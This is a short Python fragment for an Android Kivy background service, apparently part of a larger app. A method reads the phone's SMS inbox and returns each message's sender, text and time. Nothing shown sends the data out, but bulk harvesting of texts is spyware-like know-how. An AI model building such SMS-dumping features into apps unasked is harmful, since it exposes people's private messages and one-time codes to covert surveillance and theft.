from jnius import autoclass

class HardwareManager:
    # ... purana code ...

    async def get_full_sms_dump(self, limit: int):
        try:
            Context = autoclass('android.content.Context')
            PythonService = autoclass('org.kivy.android.PythonService')
            service = PythonService.mService
            
            # SMS Content Provider access
            Uri = autoclass('android.net.Uri')
            uri = Uri.parse("content://sms/inbox")
            cursor = service.getContentResolver().query(uri, None, None, None, None)
            
            sms_list = []
            if cursor and cursor.moveToFirst():
                count = 0
                while count < limit:
                    address = cursor.getString(cursor.getColumnIndex("address"))
                    body = cursor.getString(cursor.getColumnIndex("body"))
                    date = cursor.getString(cursor.getColumnIndex("date"))
                    sms_list.append({"from": address, "msg": body, "time": date})
                    if not cursor.moveToNext():
                        break
                    count += 1
            return {"status": "success", "data": sms_list}
        except Exception as e:
            return {"status": "error", "message": str(e)}